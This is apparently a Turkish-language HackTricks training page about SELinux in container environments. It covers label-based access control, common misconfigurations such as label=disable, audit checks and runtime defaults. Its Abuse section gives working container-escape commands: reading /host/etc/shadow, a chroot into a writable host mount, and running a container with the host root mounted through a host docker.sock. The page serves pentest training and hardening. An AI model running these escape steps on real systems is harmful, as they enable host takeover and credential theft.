# SELinux

{{#include ../../../../banners/hacktricks-training.md}}

## Genel Bakış

SELinux, **etiket tabanlı Zorunlu Erişim Denetimi** sistemidir. İlgili her process ve object bir security context taşıyabilir; policy, hangi domain'lerin hangi type'larla ve ne şekilde etkileşime girebileceğine karar verir. Container ortamlarında bu genellikle runtime'ın container process'ini kısıtlanmış bir container domain'i altında başlatması ve container içeriğini karşılık gelen type'larla etiketlemesi anlamına gelir. Policy düzgün çalışıyorsa process, etiketiyle etkileşime girmesi beklenen şeyleri okuyup yazabilir; bu içerik bir mount üzerinden görünür hâle gelse bile diğer host içeriğine erişimi engellenir.

Bu, yaygın Linux container deployment'larında kullanılabilen en güçlü host-side korumalardan biridir. Fedora, RHEL, CentOS Stream, OpenShift ve SELinux merkezli diğer ecosystem'lerde özellikle önemlidir. Bu ortamlarda SELinux'u göz ardı eden bir reviewer, host compromise'a giden bariz görünen bir yolun aslında neden engellendiğini çoğu zaman yanlış anlayacaktır.

## AppArmor Vs SELinux

Üst düzeydeki en kolay fark, AppArmor'un path-based, SELinux'un ise **label-based** olmasıdır. Bunun container security açısından önemli sonuçları vardır. Path-based bir policy, aynı host içeriği beklenmeyen bir mount path'i altında görünür hâle geldiğinde farklı davranabilir. Label-based bir policy ise object'in label'ının ne olduğunu ve process domain'inin onun üzerinde ne yapabileceğini sorar. Bu, SELinux'u basit hâle getirmez; ancak savunmacıların AppArmor tabanlı sistemlerde bazen yanlışlıkla yaptığı bir grup path-trick varsayımına karşı onu daha dayanıklı kılar.

Model label odaklı olduğu için container volume yönetimi ve relabeling kararları security-critical'dır. Runtime veya operator, "mount'ları çalıştırmak" için label'ları gereğinden geniş kapsamlı biçimde değiştirirse workload'u sınırlandırması gereken policy sınırı amaçlanandan çok daha zayıf hâle gelebilir.

## Lab

Host üzerinde SELinux'un aktif olup olmadığını görmek için:
```bash
getenforce 2>/dev/null
sestatus 2>/dev/null
```
Host üzerindeki mevcut etiketleri incelemek için:
```bash
ps -eZ | head
ls -Zd /var/lib/containers 2>/dev/null
ls -Zd /var/lib/docker 2>/dev/null
```
Etiketlemenin devre dışı bırakıldığı çalıştırmayla normal çalıştırmayı karşılaştırmak için:
```bash
podman run --rm fedora cat /proc/self/attr/current
podman run --rm --security-opt label=disable fedora cat /proc/self/attr/current
```
SELinux etkin bir host üzerinde bu, çok pratik bir gösterimdir; çünkü beklenen container domain altında çalışan bir workload ile bu enforcement katmanı kaldırılmış bir workload arasındaki farkı gösterir.

## Runtime Kullanımı

Podman, SELinux'un platform varsayılanının bir parçası olduğu sistemlerde SELinux ile özellikle iyi uyum sağlar. Rootless Podman ve SELinux birleşimi, yaygın container baseline'ları arasındaki en güçlü seçeneklerden biridir; çünkü process host tarafında zaten unprivileged durumdadır ve yine de MAC policy tarafından sınırlandırılır. Docker da desteklenen yerlerde SELinux kullanabilir, ancak yöneticiler bazen volume-labeling kaynaklı sorunları aşmak için SELinux'u devre dışı bırakır. CRI-O ve OpenShift, container isolation yaklaşımının bir parçası olarak büyük ölçüde SELinux'a dayanır. Kubernetes de SELinux ile ilgili ayarları sunabilir, ancak bunların değeri açıkça node OS'nin SELinux'u destekleyip gerçekten enforce etmesine bağlıdır.

Tekrarlanan ders şudur: SELinux isteğe bağlı bir süs değildir. SELinux etrafında oluşturulan ecosystem'lerde beklenen security boundary'nin bir parçasıdır.

## Misconfigurations

Klasik hata `label=disable` kullanmaktır. Operasyonel olarak bu çoğunlukla bir volume mount'un reddedilmesi ve en hızlı kısa vadeli çözümün labeling modelini düzeltmek yerine SELinux'u denklemden çıkarmak olması nedeniyle gerçekleşir. Bir diğer yaygın hata, host content'in yanlış şekilde relabel edilmesidir. Geniş kapsamlı relabel işlemleri uygulamanın çalışmasını sağlayabilir, ancak container'ın erişmesine izin verilen alanı başlangıçta amaçlanandan çok daha fazla genişletebilir.

**Installed** SELinux ile **effective** SELinux'u birbirine karıştırmamak da önemlidir. Bir host SELinux'u destekleyebilir ve yine de permissive modda olabilir veya runtime workload'u beklenen domain altında başlatmıyor olabilir. Bu durumlarda protection, documentation'ın düşündürebileceğinden çok daha zayıftır.

## Abuse

SELinux workload için absent, permissive veya geniş ölçekte disabled olduğunda, host-mounted path'ler abuse için çok daha kolay hale gelir. Aksi durumda labels tarafından sınırlandırılacak olan aynı bind mount, host data'ya veya host üzerinde değişiklik yapmaya doğrudan bir avenue haline gelebilir. Bu durum özellikle writable volume mount'lar, container runtime directory'leri veya hassas host path'lerini kolaylık amacıyla expose eden operational shortcut'larla birleştiğinde önemlidir.

SELinux, generic bir breakout writeup'ın bir host üzerinde neden hemen çalıştığını, runtime flag'leri benzer görünmesine rağmen başka bir host üzerinde neden tekrar tekrar başarısız olduğunu çoğu zaman açıklar. Eksik olan bileşen genellikle bir namespace veya capability değil, intact kalan bir label boundary'dir.

En hızlı pratik check, active context'i karşılaştırmak ve ardından normalde label-confined olması gereken mounted host path'lerini veya runtime directory'lerini probe etmektir:
```bash
getenforce 2>/dev/null
cat /proc/self/attr/current
find / -maxdepth 3 -name '*.sock' 2>/dev/null | grep -E 'docker|containerd|crio'
find /host -maxdepth 2 -ls 2>/dev/null | head
```
Bir host bind mount mevcutsa ve SELinux labeling devre dışı bırakılmış veya zayıflatılmışsa, bilgi ifşası genellikle ilk olarak ortaya çıkar:
```bash
ls -la /host/etc 2>/dev/null | head
cat /host/etc/passwd 2>/dev/null | head
cat /host/etc/shadow 2>/dev/null | head
```
Mount yazılabilir durumdaysa ve konteyner kernel açısından fiilen host-root olarak değerlendiriliyorsa, sonraki adım tahminde bulunmak yerine kontrollü bir host değişikliğini test etmektir:
```bash
touch /host/tmp/selinux_test 2>/dev/null && echo "host write works"
ls -l /host/tmp/selinux_test 2>/dev/null
```
SELinux-capable host'larda, runtime state dizinleri çevresindeki label'ların kaybedilmesi doğrudan privilege-escalation yollarını da açığa çıkarabilir:
```bash
find /host/var/run /host/run -maxdepth 2 -name '*.sock' 2>/dev/null
find /host/var/lib -maxdepth 3 \( -name docker -o -name containers -o -name containerd \) 2>/dev/null
```
Bu komutlar tam bir escape chain'in yerini tutmaz, ancak host data erişimini veya host-side file modification işlemini engelleyen şeyin SELinux olup olmadığını çok hızlı bir şekilde netleştirir.

### Full Example: SELinux Devre Dışı + Yazılabilir Host Mount

SELinux labeling devre dışıysa ve host filesystem `/host` konumuna writable olarak mount edilmişse, tam bir host escape normal bir bind-mount abuse case'ine dönüşür:
```bash
getenforce 2>/dev/null
cat /proc/self/attr/current
touch /host/tmp/selinux_escape_test
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
`chroot` başarılı olursa container process artık host filesystem üzerinden çalışır:
```bash
id
hostname
cat /etc/passwd | tail
```
### Tam Örnek: SELinux Devre Dışı + Runtime Dizini

İş yükü, etiketler devre dışı bırakıldığında bir runtime socket'ine erişebiliyorsa, kaçış runtime'a devredilebilir:
```bash
find /host/var/run /host/run -maxdepth 2 -name '*.sock' 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
```
İlgili gözlem, SELinux'un genellikle tam olarak bu tür host-path veya runtime-state erişimini engelleyen kontrol olmasıdır.

## Kontroller

SELinux kontrollerinin amacı, SELinux'un etkin olduğunu doğrulamak, mevcut security context'i belirlemek ve ilgilendiğiniz dosya veya path'lerin gerçekten label-confined olup olmadığını görmektir.
```bash
getenforce                              # Enforcing / Permissive / Disabled
ps -eZ | grep -i container              # Process labels for container-related processes
ls -Z /path/of/interest                 # File or directory labels on sensitive paths
cat /proc/self/attr/current             # Current process security context
```
Burada ilgi çekici olanlar:

- `getenforce` ideal olarak `Enforcing` döndürmelidir; `Permissive` veya `Disabled`, SELinux bölümünün tamamının anlamını değiştirir.
- Mevcut process context beklenmedik veya gereğinden geniş görünüyorsa workload, amaçlanan container policy altında çalışmıyor olabilir.
- Host-mounted dosyalar veya runtime dizinleri, process tarafından gereğinden serbest şekilde erişilebilir label'lara sahipse bind mounts çok daha tehlikeli hale gelir.

SELinux destekli bir platformda container incelerken labeling işlemini ikincil bir ayrıntı olarak değerlendirmeyin. Birçok durumda host'un henüz compromise edilmemesinin başlıca nedenlerinden biri budur.

## Runtime Varsayılanları

| Runtime / platform | Varsayılan durum | Varsayılan davranış | Yaygın manuel zayıflatma |
| --- | --- | --- | --- |
| Docker Engine | Host'a bağlı | SELinux-enabled host'larda SELinux separation kullanılabilir, ancak kesin davranış host/daemon configuration'a bağlıdır | `--security-opt label=disable`, bind mounts için geniş relabeling, `--privileged` |
| Podman | SELinux host'larında genellikle etkin | Disabled edilmediği sürece SELinux separation, SELinux sistemlerinde Podman'ın normal bir parçasıdır | `--security-opt label=disable`, `containers.conf` içinde `label=false`, `--privileged` |
| Kubernetes | Genellikle Pod seviyesinde otomatik olarak atanmaz | SELinux desteği vardır, ancak Pod'ların genellikle `securityContext.seLinuxOptions` veya platforma özgü varsayılanlara ihtiyacı vardır; runtime ve node desteği gereklidir | zayıf veya geniş `seLinuxOptions`, permissive/disabled node'larda çalıştırma, labeling'i devre dışı bırakan platform policies |
| CRI-O / OpenShift tarzı deployment'lar | Genellikle yoğun şekilde kullanılır | SELinux, bu ortamlardaki node isolation modelinin çoğunlukla temel bir parçasıdır | Erişimi gereğinden fazla genişleten custom policies, compatibility amacıyla labeling'i devre dışı bırakma |

SELinux varsayılanları, seccomp varsayılanlarına kıyasla distribution'a daha fazla bağlıdır. Fedora/RHEL/OpenShift tarzı sistemlerde SELinux, isolation modelinin çoğunlukla merkezindedir. SELinux kullanmayan sistemlerde ise yalnızca mevcut değildir.
{{#include ../../../../banners/hacktricks-training.md}}
